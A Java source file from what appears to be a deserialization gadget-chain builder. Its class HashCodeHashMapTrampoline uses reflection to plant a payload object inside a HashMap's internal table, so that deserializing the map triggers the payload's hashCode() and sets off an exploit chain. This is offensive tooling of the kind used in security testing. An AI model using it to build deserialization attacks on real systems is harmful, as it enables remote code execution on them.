package org.ses.gadgetbuilder.impl.trampolines.hashcode;

import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.chains.trampolines.noparam.HashCodeTrampoline;
import org.ses.gadgetbuilder.util.Reflections;

import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;
import java.util.Objects;

@Authors(Authors.BofeiC)
public class HashCodeHashMapTrampoline implements HashCodeTrampoline {

    @Override
    public Object wrapPayload(Object payload) throws Exception {

        HashMap<Object, Object> targetMap = new HashMap<Object, Object>();
        Reflections.setFieldValue(targetMap, "size", 1);

        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        } catch (ClassNotFoundException e) {
            nodeC = Class.forName("java.util.Map$Entry");
        }

        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        nodeCons.setAccessible(true);

        Object tbl = Array.newInstance(nodeC, 1);
        Array.set(tbl, 0, nodeCons.newInstance(0, payload, payload, null));
        Reflections.setFieldValue(targetMap, "table", tbl);

        return targetMap;
    }
}
